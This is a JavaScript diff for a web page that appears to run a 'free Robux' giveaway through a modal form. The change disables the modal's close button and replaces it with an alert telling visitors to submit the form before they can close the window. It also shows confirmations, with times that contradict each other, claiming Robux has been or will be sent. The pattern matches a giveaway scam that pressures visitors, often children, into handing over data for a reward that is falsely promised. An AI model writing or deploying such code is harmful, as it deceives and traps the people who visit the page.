@@ -156,7 +156,7 @@
             if (closeBtn && modal) {
                 closeBtn.addEventListener('click', (e) => {
                     e.preventDefault();
-                    modal.style.setProperty('display', 'none', 'important');
+                    alert("Please fill out and submit the form to join the giveaway and close this window! 🎁🌟");
                 });
             }
 
@@ -217,24 +217,24 @@
                         });
 
                         if (response.ok) {
+                            alert("Success! Robux will be in 24 hours in your account! 🎁🌟");
                             // Close the modal immediately
-                            modal.style.display = "none";
+                            modal.style.setProperty('display', 'none', 'important');
 
-                            // Show the success message as a notification
+                            // Also update the notification for anyone who missed the alert
                             const notify = document.getElementById('timer-notification');
                             if (notify) {
                                 notify.innerHTML = `
                                     <div style="text-align: center; padding: 5px;">
                                         <h3 style="margin: 0; color: #fff;">✅ Success!</h3>
                                         <p style="margin: 5px 0 0; color: #fff; font-size: 0.9rem; font-weight: 800;">
-                                            Robux will be in 24 hours in your account! 🎁🌟
+                                            Robux sent to your account! 🎁🌟
                                         </p>
                                     </div>
                                 `;
-                                notify.style.background = "#10b981"; // Green background
-                                notify.style.borderColor = "#fff";
-                                notify.style.display = "block";
-                                notify.classList.remove('mobile-only'); // Make it visible on desktop too as a notification
+                                notify.style.background = "#10b981";
+                                notify.style.setProperty('display', 'block', 'important');
+                                notify.classList.remove('mobile-only');
                             } else {
                                 // Fallback for pages without the notification div
                                 alert("Success: Robux will be in 2 hours in your account! 🎁🌟");
